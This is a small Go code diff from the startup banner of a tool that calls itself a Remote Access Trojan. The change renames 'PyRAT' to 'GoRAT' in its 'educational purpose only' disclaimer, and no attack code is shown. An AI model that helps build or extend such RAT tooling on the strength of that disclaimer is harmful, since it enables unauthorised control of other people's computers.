@@ -14,7 +14,7 @@ func MainBanner() error {
 	pterm.DefaultCenter.Println(s)
 
 	pterm.Info.Println("Remote Access Trojan by @erofcon https://github.com/erofcon")
-	pterm.Info.Println("This tool is for educational purpose only, usage of PyRAT for attacking targets without prior mutual consent is illegal.")
+	pterm.Info.Println("This tool is for educational purpose only, usage of GoRAT for attacking targets without prior mutual consent is illegal.")
 	pterm.Info.Println("Input 'help' or 'h' to show commands")
 
 	return err
